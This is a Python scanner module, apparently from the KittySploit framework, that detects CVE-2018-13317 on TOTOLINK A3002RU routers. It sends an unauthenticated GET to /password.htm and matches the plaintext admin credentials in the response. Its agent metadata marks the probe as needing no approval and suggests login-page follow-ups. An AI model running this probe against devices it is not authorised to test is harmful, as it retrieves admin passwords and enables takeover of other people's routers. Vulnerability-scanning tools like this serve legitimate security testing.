#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""TOTOLINK A3002RU firmware version 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'TOTOLINK A3002RU 1.0.8 - Information Disclosure Detection',
        'description': 'TOTOLINK A3002RU firmware version 1.0.8 contains a vulnerability in which an unauthenticated attacker can obtain the plaintext admin password by making a GET request for `password.htm`. This allows remote attackers to gain administrative access without credentials.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'totolink', 'password', 'exposure', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://blog.securityevaluators.com/new-vulnerabilities-in-totolink-a3002ru-d6f42a081154',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-13317',
        ],
        'cve': 'CVE-2018-13317',
    }

    def run(self):
        r = self.http_request(method="GET", path='/password.htm', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ("orgpassword=''",)
        body_regexes = ('orgpassword=[^&\\s]+"', 'orgusername=[^&\\s]+',)
        if (any(m in body for m in body_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="TOTOLINK A3002RU 1.0.8 - Information Disclosure detected",
                path='/password.htm',
            )
            return True
        return False

